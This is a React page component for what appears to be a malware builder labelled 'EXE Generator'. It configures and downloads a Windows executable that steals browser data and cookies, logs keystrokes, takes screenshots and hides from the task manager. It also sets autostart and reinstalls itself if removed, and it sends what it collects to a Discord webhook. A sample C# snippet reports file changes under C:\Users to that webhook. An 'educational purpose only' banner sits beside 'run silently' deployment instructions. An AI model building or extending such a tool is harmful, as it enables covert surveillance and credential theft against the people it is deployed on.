
import { useState } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { Textarea } from '@/components/ui/textarea';
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from '@/components/ui/card';
import { Label } from '@/components/ui/label';
import { Badge } from '@/components/ui/badge';
import { Alert, AlertDescription } from '@/components/ui/alert';
import { 
  Download, 
  Monitor, 
  Code, 
  Settings,
  Shield,
  Globe,
  Camera,
  FileText,
  Zap,
  CheckCircle,
  AlertTriangle
} from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { useAuth } from '@/contexts/AuthContext';
import SnowEffect from '@/components/ui/snow-effect';
import Sidebar from '@/components/dashboard/sidebar';

interface ExeConfig {
  name: string;
  description: string;
  version: string;
  features: string[];
  webhookUrl: string;
  customCode: string;
  stealth: boolean;
  autostart: boolean;
  persistence: boolean;
}

export default function ExeGenerator() {
  const [config, setConfig] = useState<ExeConfig>({
    name: 'SystemMonitor',
    description: 'System monitoring and data collection tool',
    version: '1.0.0',
    features: ['system_info', 'browser_data', 'file_monitoring'],
    webhookUrl: '',
    customCode: '',
    stealth: true,
    autostart: false,
    persistence: false
  });
  const [isGenerating, setIsGenerating] = useState(false);
  const { toast } = useToast();
  const { user } = useAuth();

  const availableFeatures = [
    { id: 'system_info', label: 'System Info', description: 'Collect system information', icon: Monitor },
    { id: 'browser_data', label: 'Browser Data', description: 'Extract browser data and cookies', icon: Globe },
    { id: 'screenshot', label: 'Screenshots', description: 'Capture screen periodically', icon: Camera },
    { id: 'file_monitoring', label: 'File Monitor', description: 'Monitor file system changes', icon: FileText },
    { id: 'keylogger', label: 'Keystroke Logging', description: 'Log keyboard activity', icon: Zap },
    { id: 'network_monitor', label: 'Network Monitor', description: 'Monitor network activity', icon: Shield },
    { id: 'process_monitor', label: 'Process Monitor', description: 'Track running processes', icon: Settings }
  ];

  const toggleFeature = (feature: string) => {
    setConfig(prev => ({
      ...prev,
      features: prev.features.includes(feature)
        ? prev.features.filter(f => f !== feature)
        : [...prev.features, feature]
    }));
  };

  const generateExe = async () => {
    if (!config.name.trim()) {
      toast({
        title: "Name Required",
        description: "Please enter an executable name",
        variant: "destructive"
      });
      return;
    }

    setIsGenerating(true);

    try {
      const response = await fetch('/api/generate-exe', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${localStorage.getItem('token')}`
        },
        body: JSON.stringify(config)
      });

      if (!response.ok) {
        throw new Error('Failed to generate executable');
      }

      const blob = await response.blob();
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `${config.name.replace(/\s+/g, '_')}.exe`;
      document.body.appendChild(a);
      a.click();
      window.URL.revokeObjectURL(url);
      document.body.removeChild(a);

      toast({
        title: "Executable Generated",
        description: "Your Windows executable has been downloaded successfully!",
      });
    } catch (error) {
      toast({
        title: "Generation Failed",
        description: "Failed to generate executable. Please try again.",
        variant: "destructive"
      });
    } finally {
      setIsGenerating(false);
    }
  };

  return (
    <div className="flex h-screen bg-background relative overflow-hidden">
      <SnowEffect color="#ffffff" glow={true} density={60} speed={1.2} />
      <Sidebar />

      <main className="flex-1 overflow-auto relative z-10">
        <header className="bg-card/80 backdrop-blur-md border-b border-border px-6 py-4">
          <div className="flex items-center justify-between">
            <div className="animate-slide-in-up">
              <h2 className="text-2xl font-semibold text-foreground drop-shadow-lg">EXE Generator</h2>
              <p className="text-muted-foreground">Create custom Windows executables for data collection</p>
            </div>
            <Badge className="bg-red-500/20 text-red-300 border-red-500/30">
              <Monitor className="w-4 h-4 mr-1" />
              Windows Executable
            </Badge>
          </div>
        </header>

        <div className="p-6 space-y-6">
          {/* Warning Alert */}
          <Alert className="bg-yellow-900/50 border-yellow-500/50">
            <AlertTriangle className="h-4 w-4 text-yellow-400" />
            <AlertDescription className="text-yellow-200">
              <strong>Educational Purpose Only:</strong> This tool is designed for educational and security research purposes. 
              Always obtain proper authorization before using generated executables. Misuse may violate laws and regulations.
            </AlertDescription>
          </Alert>

          {/* Basic Configuration */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Settings className="h-5 w-5 text-blue-400" />
                Basic Configuration
              </CardTitle>
              <CardDescription className="text-gray-300">
                Configure the basic settings for your Windows executable
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <Label htmlFor="name" className="text-gray-300">Executable Name</Label>
                  <Input
                    id="name"
                    value={config.name}
                    onChange={(e) => setConfig(prev => ({ ...prev, name: e.target.value }))}
                    className="bg-white/5 border-white/20 text-white"
                    placeholder="SystemMonitor"
                  />
                </div>
                <div>
                  <Label htmlFor="version" className="text-gray-300">Version</Label>
                  <Input
                    id="version"
                    value={config.version}
                    onChange={(e) => setConfig(prev => ({ ...prev, version: e.target.value }))}
                    className="bg-white/5 border-white/20 text-white"
                    placeholder="1.0.0"
                  />
                </div>
              </div>
              <div>
                <Label htmlFor="description" className="text-gray-300">Description</Label>
                <Textarea
                  id="description"
                  value={config.description}
                  onChange={(e) => setConfig(prev => ({ ...prev, description: e.target.value }))}
                  className="bg-white/5 border-white/20 text-white"
                  placeholder="Describe what your executable does..."
                  rows={3}
                />
              </div>
              <div>
                <Label htmlFor="webhook" className="text-gray-300">Webhook URL (Required)</Label>
                <Input
                  id="webhook"
                  value={config.webhookUrl}
                  onChange={(e) => setConfig(prev => ({ ...prev, webhookUrl: e.target.value }))}
                  className="bg-white/5 border-white/20 text-white"
                  placeholder="https://discord.com/api/webhooks/..."
                />
              </div>
            </CardContent>
          </Card>

          {/* Features */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-left">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Code className="h-5 w-5 text-purple-400" />
                Data Collection Features
              </CardTitle>
              <CardDescription className="text-gray-300">
                Choose what information your executable will collect
              </CardDescription>
            </CardHeader>
            <CardContent>
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-3">
                {availableFeatures.map((feature) => {
                  const Icon = feature.icon;
                  return (
                    <div
                      key={feature.id}
                      onClick={() => toggleFeature(feature.id)}
                      className={`p-4 rounded-lg border cursor-pointer transition-all ${
                        config.features.includes(feature.id)
                          ? 'bg-red-500/20 border-red-500/50 text-red-300'
                          : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                      }`}
                    >
                      <div className="flex items-center gap-3">
                        <Icon className="h-5 w-5" />
                        <div className="flex-1">
                          <div className="flex items-center justify-between">
                            <span className="font-medium">{feature.label}</span>
                            {config.features.includes(feature.id) && (
                              <CheckCircle className="h-4 w-4 text-red-400" />
                            )}
                          </div>
                          <p className="text-xs opacity-75 mt-1">{feature.description}</p>
                        </div>
                      </div>
                    </div>
                  );
                })}
              </div>
            </CardContent>
          </Card>

          {/* Advanced Options */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-right">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Shield className="h-5 w-5 text-red-400" />
                Advanced Options
              </CardTitle>
              <CardDescription className="text-gray-300">
                Configure stealth and persistence options
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                <div
                  onClick={() => setConfig(prev => ({ ...prev, stealth: !prev.stealth }))}
                  className={`p-4 rounded-lg border cursor-pointer transition-all ${
                    config.stealth
                      ? 'bg-red-500/20 border-red-500/50 text-red-300'
                      : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium">Stealth Mode</span>
                    {config.stealth && <CheckCircle className="h-4 w-4 text-red-400" />}
                  </div>
                  <p className="text-xs opacity-75 mt-1">Hide from task manager and system detection</p>
                </div>

                <div
                  onClick={() => setConfig(prev => ({ ...prev, autostart: !prev.autostart }))}
                  className={`p-4 rounded-lg border cursor-pointer transition-all ${
                    config.autostart
                      ? 'bg-red-500/20 border-red-500/50 text-red-300'
                      : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium">Auto Start</span>
                    {config.autostart && <CheckCircle className="h-4 w-4 text-red-400" />}
                  </div>
                  <p className="text-xs opacity-75 mt-1">Start automatically on system boot</p>
                </div>

                <div
                  onClick={() => setConfig(prev => ({ ...prev, persistence: !prev.persistence }))}
                  className={`p-4 rounded-lg border cursor-pointer transition-all ${
                    config.persistence
                      ? 'bg-red-500/20 border-red-500/50 text-red-300'
                      : 'bg-white/5 border-white/20 text-gray-300 hover:bg-white/10'
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <span className="font-medium">Persistence</span>
                    {config.persistence && <CheckCircle className="h-4 w-4 text-red-400" />}
                  </div>
                  <p className="text-xs opacity-75 mt-1">Reinstall if removed or detected</p>
                </div>
              </div>
            </CardContent>
          </Card>

          {/* Custom Code */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardHeader>
              <CardTitle className="text-white flex items-center gap-2">
                <Code className="h-5 w-5 text-yellow-400" />
                Custom Code
              </CardTitle>
              <CardDescription className="text-gray-300">
                Add custom C# code to execute in your executable (optional)
              </CardDescription>
            </CardHeader>
            <CardContent>
              <Textarea
                value={config.customCode}
                onChange={(e) => setConfig(prev => ({ ...prev, customCode: e.target.value }))}
                className="bg-white/5 border-white/20 text-white font-mono text-sm"
                placeholder="// Add your custom C# code here
using System;
using System.IO;

// Example: Custom file monitoring
public void MonitorFiles()
{
    var watcher = new FileSystemWatcher(@\"C:\Users\");
    watcher.Changed += (sender, e) => {
        SendToWebhook($\"File changed: {e.FullPath}\");
    };
    watcher.EnableRaisingEvents = true;
}"
                rows={12}
              />
            </CardContent>
          </Card>

          {/* Generate Button */}
          <Card className="bg-black/40 backdrop-blur-md border-white/10 shadow-2xl animate-slide-in-up">
            <CardContent className="pt-6">
              <div className="flex flex-col sm:flex-row items-center justify-between gap-4">
                <div>
                  <h3 className="text-white font-semibold">Ready to Generate</h3>
                  <p className="text-gray-400 text-sm">
                    Your executable will be compiled and ready for Windows deployment
                  </p>
                </div>
                <Button
                  onClick={generateExe}
                  disabled={isGenerating || !config.name.trim() || !config.webhookUrl.trim()}
                  className="bg-gradient-to-r from-red-600 to-purple-600 hover:from-red-700 hover:to-purple-700 text-white"
                  size="lg"
                >
                  {isGenerating ? (
                    <>
                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-white mr-2"></div>
                      Generating...
                    </>
                  ) : (
                    <>
                      <Download className="mr-2 h-4 w-4" />
                      Generate EXE
                    </>
                  )}
                </Button>
              </div>

              <Alert className="mt-4 bg-red-900/50 border-red-500/50">
                <Monitor className="h-4 w-4 text-red-400" />
                <AlertDescription className="text-red-200">
                  <strong>Deployment Instructions:</strong> The generated executable will run silently on Windows systems.
                  It will collect data based on selected features and send reports to your Discord webhook.
                  Use responsibly and only with proper authorization.
                </AlertDescription>
              </Alert>
            </CardContent>
          </Card>
        </div>
      </main>
    </div>
  );
}
